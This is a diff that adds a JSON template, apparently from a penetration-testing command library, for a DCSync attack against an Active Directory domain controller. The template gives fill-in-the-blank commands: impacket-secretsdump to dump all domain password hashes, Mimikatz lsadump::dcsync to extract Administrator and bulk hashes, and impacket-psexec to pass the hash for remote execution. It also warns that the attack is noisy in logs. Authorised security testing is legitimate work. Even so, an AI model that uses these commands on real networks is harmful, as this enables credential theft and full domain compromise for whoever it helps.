@@ -1,0 +1,12 @@
+{
+  "name": "DCSync Attack",
+  "description": "Hash extraction through DCSync",
+  "category": "ad",
+  "variables": [
+    "domain",
+    "dc_ip",
+    "username",
+    "password"
+  ],
+  "content": "Perform a DCSync attack on {domain} with the supplied credentials.\n\n**Prerequisites :**\nThe account must have these rights :\n- DS-Replication-Get-Changes\n- DS-Replication-Get-Changes-All\n\n**Impacket secretsdump :**\n```bash\n# All hashes\nimpacket-secretsdump {domain}/{username}:'{password}'@{dc_ip}\n\n# Hash of a specific user\nimpacket-secretsdump {domain}/{username}:'{password}'@{dc_ip} -just-dc-user Administrator\n```\n\n**With Mimikatz (if DC access is available) :**\n```\nlsadump::dcsync /domain:{domain} /user:Administrator\nlsadump::dcsync /domain:{domain} /all /csv\n```\n\n**Post-exploitation :**\n```bash\n# Pass-the-hash with the Administrator NT hash\nimpacket-psexec -hashes :NTHASH Administrator@{dc_ip}\n```\n\n⚠️ DCSync generates substantial log activity. Use with caution."
+}
